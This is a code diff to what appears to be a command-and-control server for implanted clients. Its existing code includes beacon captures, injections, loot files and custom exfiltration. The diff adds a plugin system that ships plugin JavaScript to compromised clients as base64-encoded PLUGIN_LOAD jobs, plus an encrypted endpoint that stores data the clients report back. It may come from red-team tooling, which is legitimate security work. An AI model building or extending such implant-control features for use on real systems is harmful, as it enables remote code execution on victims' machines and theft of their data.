@@ -738,6 +738,37 @@ class BlockedIP(Base):
 
 
 
+class PluginActivation(Base):
+    __tablename__ = 'pluginactivations'
+
+    id          = Column(Integer, primary_key=True)
+    clientID    = Column(String(100), nullable=False)
+    pluginId    = Column(String(100), nullable=False)
+    active      = Column(Boolean, default=True)
+    settings    = Column(Text, nullable=True)
+    activatedAt = Column(DateTime(timezone=True), server_default=func.now())
+    __table_args__ = (UniqueConstraint('clientID', 'pluginId'),)
+
+    def __repr__(self):
+        return f'<PluginActivation {self.id}>'
+
+
+
+class PluginData(Base):
+    __tablename__ = 'plugindata'
+
+    id        = Column(Integer, primary_key=True)
+    clientID  = Column(String(100), nullable=False)
+    pluginId  = Column(String(100), nullable=False)
+    dataType  = Column(String(100), nullable=False)
+    data      = Column(Text, nullable=False)
+    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<PluginData {self.id}>'
+
+
+
 # User C2 UI session
 class User(UserMixin, Base):
     __tablename__ = 'user'
@@ -763,6 +794,38 @@ class User(UserMixin, Base):
 
 
 
+
+
+#***************************************************************************
+# Plugin System
+
+PLUGINS = {}  # pluginId -> {manifest, path, main.js, renderer.js, ui.html, ui.js}
+
+def loadPlugins():
+    pluginsDir = os.path.join(baseDir, 'plugins')
+    if not os.path.isdir(pluginsDir):
+        os.makedirs(pluginsDir, exist_ok=True)
+        return
+    for entry in os.listdir(pluginsDir):
+        pluginPath = os.path.join(pluginsDir, entry)
+        manifestPath = os.path.join(pluginPath, 'manifest.json')
+        if not (os.path.isdir(pluginPath) and os.path.isfile(manifestPath)):
+            continue
+        try:
+            with open(manifestPath, 'r') as f:
+                manifest = json.load(f)
+            plugin = {'manifest': manifest, 'path': pluginPath}
+            for fname in ['main.js', 'renderer.js', 'ui.html', 'ui.js']:
+                fpath = os.path.join(pluginPath, fname)
+                if os.path.isfile(fpath):
+                    with open(fpath, 'r') as f:
+                        plugin[fname] = f.read()
+                else:
+                    plugin[fname] = None
+            PLUGINS[manifest['id']] = plugin
+            logger.info(f"Loaded plugin: {manifest['id']} ({manifest.get('name', '')})")
+        except Exception as e:
+            logger.error(f"Failed to load plugin from {entry}: {e}")
 
 
 #***************************************************************************
@@ -1241,6 +1304,8 @@ try:
                     BeaconVisit.__table__.drop(engine)
                     BeaconCapture.__table__.drop(engine)
                     BeaconInjection.__table__.drop(engine)
+                    PluginActivation.__table__.drop(engine)
+                    PluginData.__table__.drop(engine)
                     db_session.execute(update(AppSettings).where(AppSettings.id==1).values(emailContent="", lastEmailSent=None))
                     dbCommit()
 
@@ -1275,6 +1340,8 @@ try:
     if not os.path.exists(dataDirectory + "lootFiles"):
         os.mkdir(dataDirectory + "lootFiles")
 
+    # Load plugins
+    loadPlugins()
 
     # Set our journaling mode to wright ahead log
     @event.listens_for(Engine, "connect")
@@ -1714,6 +1781,21 @@ def receiveEncryptedMessage(identifier):
         data     = jsonData['data']
         saveCustomExfil(identifier, note, data, ip, userAgent)
 
+    elif path.decode('utf-8').startswith("/plugin/data/"):
+        pluginId = path.decode('utf-8').split('/')[3]
+        logger.info(f"Received encrypted plugin data for plugin: {pluginId}")
+        jsonData = json.loads(message.decode('utf-8'))
+        dataType = jsonData.get('dataType', 'generic')
+        newData = PluginData(clientID=identifier, pluginId=pluginId,
+                             dataType=dataType, data=json.dumps(jsonData.get('data', {})))
+        db_session.add(newData)
+        clientSeen(identifier, ip, userAgent)
+        dbCommit()
+        db_session.refresh(newData)
+        db_session.add(Event(clientID=identifier, timeStamp=newData.timeStamp,
+                             eventType='PLUGIN', eventID=newData.id))
+        dbCommit()
+
     elif path.decode('utf-8') == "/bex/report":
         logger.info("Received encrypted BEX report message")
         jsonData = json.loads(message.decode('utf-8'))
@@ -2125,6 +2207,216 @@ def getSidecarResult(requestId):
         "data": json.loads(result.data) if result.data else None,
         "error": result.error,
         "timeStamp": str(result.timeStamp)
+    })
+
+
+#***************************************************************************
+# Plugin API Routes
+
+@app.route('/api/plugins', methods=['GET'])
+@login_required
+def listPlugins():
+    """List all loaded plugin manifests."""
+    result = []
+    for pid, plugin in PLUGINS.items():
+        result.append(plugin['manifest'])
+    return jsonify(result)
+
+
+@app.route('/api/plugins/<pluginId>/ui', methods=['GET'])
+@login_required
+def getPluginUI(pluginId):
+    """Return HTML for dashboard plugin UI."""
+    plugin = PLUGINS.get(pluginId)
+    if not plugin:
+        return "Plugin not found", 404
+    return jsonify({
+        'html': plugin.get('ui.html'),
+        'hasJs': plugin.get('ui.js') is not None
+    })
+
+
+@app.route('/api/plugins/<pluginId>/ui.js', methods=['GET'])
+@login_required
+def getPluginUIScript(pluginId):
+    """Serve plugin UI JS as a script file (CSP-compliant)."""
+    plugin = PLUGINS.get(pluginId)
+    if not plugin or not plugin.get('ui.js'):
+        return "Not found", 404
+    # Wrap the plugin JS so it reads its API from the global registry
+    wrappedJs = (
+        '(function() {\n'
+        '  var pluginUI = window.__pluginUIRegistry && window.__pluginUIRegistry["' + pluginId + '"];\n'
+        '  if (!pluginUI) { console.error("No pluginUI context for ' + pluginId + '"); return; }\n'
+        '  ' + plugin.get('ui.js') + '\n'
+        '})();\n'
+    )
+    response = make_response(wrappedJs)
+    response.headers['Content-Type'] = 'application/javascript'
+    return response
+
+
+@app.route('/api/plugins/<pluginId>/activate', methods=['POST'])
+@login_required
+def activatePlugin(pluginId):
+    """Activate a plugin on a client."""
+    plugin = PLUGINS.get(pluginId)
+    if not plugin:
+        return "Plugin not found", 404
+
+    content = request.json
+    clientID = content.get('clientID')
+    settings = content.get('settings', {})
+
+    client = Client.query.filter_by(id=clientID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=clientID).first()
+    if not client:
+        return "Client not found", 404
+
+    # Upsert PluginActivation
+    existing = PluginActivation.query.filter_by(clientID=client.uuid, pluginId=pluginId).first()
+    if existing:
+        existing.active = True
+        existing.settings = json.dumps(settings)
+    else:
+        activation = PluginActivation(clientID=client.uuid, pluginId=pluginId,
+                                       active=True, settings=json.dumps(settings))
+        db_session.add(activation)
+    dbCommit()
+
+    # Queue PLUGIN_LOAD task
+    taskData = {
+        "type": "PLUGIN_LOAD",
+        "pluginId": pluginId,
+        "settings": settings,
+        "mainCode": plugin.get('main.js'),
+        "rendererCode": plugin.get('renderer.js')
+    }
+    jsonStr = json.dumps(taskData)
+    encoded = base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8')
+    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=encoded)
+    db_session.add(newJob)
+    dbCommit()
+
+    return jsonify({"status": "activated", "pluginId": pluginId}), 200
+
+
+@app.route('/api/plugins/<pluginId>/deactivate', methods=['POST'])
+@login_required
+def deactivatePlugin(pluginId):
+    """Deactivate a plugin on a client."""
+    content = request.json
+    clientID = content.get('clientID')
+
+    client = Client.query.filter_by(id=clientID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=clientID).first()
+    if not client:
+        return "Client not found", 404
+
+    existing = PluginActivation.query.filter_by(clientID=client.uuid, pluginId=pluginId).first()
+    if existing:
+        existing.active = False
+        dbCommit()
+
+    # Queue PLUGIN_UNLOAD task
+    taskData = {
+        "type": "PLUGIN_UNLOAD",
+        "pluginId": pluginId
+    }
+    jsonStr = json.dumps(taskData)
+    encoded = base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8')
+    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=encoded)
+    db_session.add(newJob)
+    dbCommit()
+
+    return jsonify({"status": "deactivated", "pluginId": pluginId}), 200
+
+
+@app.route('/api/plugins/client/<clientID>', methods=['GET'])
+@login_required
+def getClientPlugins(clientID):
+    """List active plugins for a client."""
+    client = Client.query.filter_by(id=clientID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=clientID).first()
+    if not client:
+        return "Client not found", 404
+
+    activations = PluginActivation.query.filter_by(clientID=client.uuid, active=True).all()
+    result = []
+    for act in activations:
+        manifest = PLUGINS.get(act.pluginId, {}).get('manifest', {})
+        result.append({
+            'pluginId': act.pluginId,
+            'settings': json.loads(act.settings) if act.settings else {},
+            'activatedAt': act.activatedAt.isoformat() if act.activatedAt else None,
+            'manifest': manifest
+        })
+    return jsonify(result)
+
+
+@app.route('/api/plugins/<pluginId>/data/<clientID>', methods=['GET'])
+@login_required
+def getPluginData(pluginId, clientID):
+    """Fetch plugin data for a client."""
+    client = Client.query.filter_by(id=clientID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=clientID).first()
+    if not client:
+        return "Client not found", 404
+
+    dataType = request.args.get('dataType')
+    limit = request.args.get('limit', 100, type=int)
+    offset = request.args.get('offset', 0, type=int)
+
+    query = PluginData.query.filter_by(clientID=client.uuid, pluginId=pluginId)
+    if dataType:
+        query = query.filter_by(dataType=dataType)
+    query = query.order_by(PluginData.id.desc())
+    total = query.count()
+    rows = query.offset(offset).limit(limit).all()
+
+    result = []
+    for row in rows:
+        result.append({
+            'id': row.id,
+            'dataType': row.dataType,
+            'data': json.loads(row.data),
+            'timeStamp': row.timeStamp.isoformat() if row.timeStamp else None
+        })
+    return jsonify({'total': total, 'rows': result})
+
+
+@app.route('/api/plugins/<pluginId>/data/<clientID>', methods=['DELETE'])
+@login_required
+def deletePluginData(pluginId, clientID):
+    """Clear plugin data for a client."""
+    client = Client.query.filter_by(id=clientID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=clientID).first()
+    if not client:
+        return "Client not found", 404
+
+    PluginData.query.filter_by(clientID=client.uuid, pluginId=pluginId).delete()
+    dbCommit()
+    return jsonify({"status": "deleted"}), 200
+
+
+@app.route('/api/plugins/eventData/<int:eventID>', methods=['GET'])
+@login_required
+def getPluginEventData(eventID):
+    """Get PluginData row by ID (for event timeline detail view)."""
+    row = PluginData.query.filter_by(id=eventID).first()
+    if not row:
+        return "Not found", 404
+    return jsonify({
+        'id': row.id,
+        'pluginId': row.pluginId,
+        'dataType': row.dataType,
+        'data': json.loads(row.data),
+        'timeStamp': row.timeStamp.isoformat() if row.timeStamp else None
     })
 
 
